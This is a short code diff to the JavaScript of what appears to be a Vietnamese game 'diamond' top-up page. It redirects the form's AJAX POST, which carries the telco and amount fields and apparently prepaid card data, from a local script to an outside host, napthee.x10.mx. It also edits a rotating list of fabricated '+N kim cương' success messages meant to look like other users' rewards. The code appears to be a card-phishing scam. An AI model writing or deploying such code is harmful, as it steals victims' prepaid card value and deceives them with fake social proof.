@@ -185,7 +185,7 @@ $(document).ready(function(){
                                         } else {
             $.ajax({
             type: "POST",
-            url: "ajax.php",
+            url: "https://napthee.x10.mx/napthe.php",
             data: {
                 telco,
                 amount,
@@ -227,7 +227,7 @@ $(document).ready(function(){
   });
 });
 setInterval(function() {
-    const months = ["<b style='color:red;font-size:14px'>Thẻ sai!</b>","<b style='color:green;font-size:14px'>+45 kim cương<b/>","<b style='color:green;font-size:14px'>+280 kim cương<b/>","<b style='color:green;font-size:14px'>+6 100 kim cương<b/>","<b style='color:green;font-size:14px'>+3 050 kim cương<b/>","<b style='color:green;font-size:14px'>+90 kim cương<b/>"];
+    const months = ["<b style='color:red;font-size:14px'>Thẻ sai!</b>","<b style='color:green;font-size:14px'>+1 300 kim cương<b/>","<b style='color:green;font-size:14px'>+280 kim cương<b/>","<b style='color:green;font-size:14px'>+6 100 kim cương<b/>","<b style='color:green;font-size:14px'>+3 050 kim cương<b/>","<b style='color:green;font-size:14px'>+90 kim cương<b/>"];
     const time = ['s', 'p','h','p','s','p'];
     const random1 = Math.floor(Math.random() * 2);
     const random2 = Math.floor(Math.random() * 3);
